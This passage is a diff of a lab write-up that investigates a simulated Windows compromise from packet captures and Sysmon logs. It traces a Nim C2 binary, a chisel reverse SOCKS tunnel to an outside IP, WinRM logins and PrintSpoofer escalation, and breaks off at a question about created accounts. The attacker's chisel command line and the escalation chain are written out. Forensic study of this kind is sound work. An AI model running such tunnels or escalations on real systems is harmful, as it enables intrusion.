@@ -145,4 +145,108 @@ The Base64 encoded string uses a parameter named `q` as we can see at the start 
 
 ### The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?
 
-/9ab62b5
+The URL used is `/9ab62b5`
+
+### What is the HTTP method used by the binary?
+
+GET
+
+### Based on the user agent, what programming language was used by the attacker to compile the binary? 
+
+Nim
+
+<img width="325" height="119" alt="image" src="https://github.com/user-attachments/assets/bd8867ec-703f-4d4f-95c7-d17459a9c00f" />
+
+---
+
+## Discovery - Internal Reconnaissance 
+
+### The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?
+
+Continuing in the packet capture file and decoding more of the Base64 encoded c2 communication, I identified one that contained the password in question.
+
+<img width="921" height="154" alt="image" src="https://github.com/user-attachments/assets/373e0fe0-29f1-4108-a10f-5e17c6c71b83" />
+
+Decoded Base64 using Cyber Chef, the password is `infernotempest`
+
+<img width="1522" height="746" alt="image" src="https://github.com/user-attachments/assets/7f29afe5-3133-4eec-ba77-299ada4e2e6e" />
+
+### The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?
+
+For some strange reason I was unable to copy and paste the base64 encoded string over from the offline VM to my machine to check Cyber Chef. So I used Powershell on the VM to decode the following
+
+<img width="939" height="477" alt="image" src="https://github.com/user-attachments/assets/bde12d7f-ffae-4885-8671-70c0e5d3a199" />
+
+As we can see on the list there is a known port for remote connection. Port `5985 Windows Remote Management (WinRM) over HTTP.`
+
+### The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?
+
+The last seen encoded Base64 command decodes to show the attacker checking the directory for the file `ch.exe`
+
+<img width="1018" height="831" alt="image" src="https://github.com/user-attachments/assets/51b1dbbd-6a50-449f-b6f3-b682113f7eee" />
+
+Pivoting back into Sysmon View I looked into the process view of `ch.exe` and found a process created. Clicking it reveals the command the attacker ran for establishing the connection.
+
+`C:\Users\benimaru\Downloads\ch.exe\ client 167.71.199.191:8080 R:socks`
+
+<img width="695" height="632" alt="image" src="https://github.com/user-attachments/assets/d30b8782-a4f1-403c-86b1-4427376b6561" />
+
+We also see the SHA256 hash: `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`
+
+### What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.
+
+Running the hash in VirusTotal reveals a number of different names. For this exercise, the name is `chisel`
+
+<img width="614" height="352" alt="image" src="https://github.com/user-attachments/assets/c10d89aa-2c60-4236-8b75-3a2cafe4b55e" />
+
+### The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate? 
+
+The attacker used the winrm service to authenticate over port 5985
+
+---
+
+## Privilege Escalation
+
+### After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?
+
+Inside Sysmon View I discovered another binary downloaded with powershell shortly after the remote access was established.
+
+<img width="503" height="549" alt="image" src="https://github.com/user-attachments/assets/d1467628-714d-42ba-83e0-a6869a0e294c" />
+
+This binary is called `spf.exe` and the SHA256 hash is `8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`
+
+<img width="700" height="643" alt="image" src="https://github.com/user-attachments/assets/34fb6129-8b07-445a-84c1-1be713901af8" />
+
+
+### Based on the SHA256 hash of the binary, what is the name of the tool used?
+
+Running the SHA256 hash in VirusTotal I learned the tool used is `PrintSpoofer`
+
+<img width="667" height="218" alt="image" src="https://github.com/user-attachments/assets/fd4c1cbc-4ba0-41ca-803d-ea26795ba9ff" />
+
+### The tool exploits a specific privilege owned by the user. What is the name of the privilege?
+
+The name of the privilege is `SeImpersonatePrivilege`
+
+<img width="681" height="115" alt="image" src="https://github.com/user-attachments/assets/494df779-4d04-4013-a815-555e47965461" />
+
+
+### Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?
+
+In the previous screenshot of spf.exe I can see a command is run to execute the binary `final.exe`
+
+### The binary connects to a different port from the first c2 connection. What is the port used?
+
+Looking into the final.exe binary on Sysmon View I can see a network connection established over port `8080`
+
+<img width="724" height="559" alt="image" src="https://github.com/user-attachments/assets/430a3c50-e275-45ef-8c81-8499cead7c94" />
+
+
+---
+
+## Fully Owned Machine
+
+
+### Upon achieving SYSTEM access, the attacker then created two users. What are the account names?
+
+
